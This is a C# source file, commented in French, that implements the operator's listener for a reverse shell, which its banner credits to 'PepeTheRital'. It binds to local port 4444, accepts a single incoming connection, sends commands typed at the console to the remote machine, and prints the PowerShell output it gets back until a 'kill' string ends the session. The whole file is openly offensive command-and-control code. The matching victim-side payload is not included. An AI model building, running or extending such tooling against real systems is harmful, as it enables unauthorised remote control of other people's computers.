using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace SocketProjetFrame
{
    class Program
    {
        public static int Main(string[] args)
        {
            StartServer();
            return 0;
        }

        public static void StartServer()
        {
            string ip_listener = "127.0.0.1";
            int port_listener = 4444;

            IPHostEntry host = Dns.GetHostEntry(ip_listener);
            IPAddress ipAddress = host.AddressList[0];
            IPEndPoint localEndPoint = new IPEndPoint(ipAddress, port_listener);

            try
            {
                Socket listener = new Socket(ipAddress.AddressFamily, SocketType.Stream, ProtocolType.Tcp);//Creation du socket avec protocole TCP
                listener.Bind(localEndPoint);//Demarrage du socket
                listener.Listen(10);//Au bout de 10 requetes consécutif, le listener répondra occupé

                Console.WriteLine("Rerverse shell par PepeTheRital");
                Console.WriteLine("IP d'ecoute : " + ip_listener);
                Console.WriteLine("Port d'écoute: " + port_listener);
                Console.WriteLine("----------------------------------");

                Socket handler = listener.Accept();

                Console.WriteLine("Connecter a {0}", handler.RemoteEndPoint.ToString());
                Console.WriteLine("----------------------------------");

                //Variable pour recepetion des données
                string data_client = null;
                string send_commmand = null;
                byte[] bytes = null;

                while (true)
                {
                    //Envoie de la commande

                    send_commmand = Console.ReadLine();
                    byte[] message = Encoding.ASCII.GetBytes(send_commmand);
                    handler.Send(message);

                    //Recepetion de la donnée de la donne, puis la depose dans la variable (string) data_client
                    bytes = new byte[1024];
                    int bytesRec = handler.Receive(bytes);
                    data_client += Encoding.ASCII.GetString(bytes, 0, bytesRec);

                    if (data_client.IndexOf("kill") > -1)//Si il recoit kill la connection stop
                    {
                        break;
                    }

                 
                    else
                    {
                        Console.WriteLine("powershell > {0}", send_commmand);
                        Console.WriteLine(data_client);
                        Console.WriteLine("----------------------------------");

                        data_client = "";
                    }
                }

               

                //Fermeture du socket
                handler.Shutdown(SocketShutdown.Both);
                handler.Close();
            }

            catch (Exception e)
            {
                Console.WriteLine("error");
                Console.WriteLine(e.ToString());
            }

            Console.WriteLine("Appuyer sur une touche pour continuer");
            Console.ReadKey();


        }
    }
}
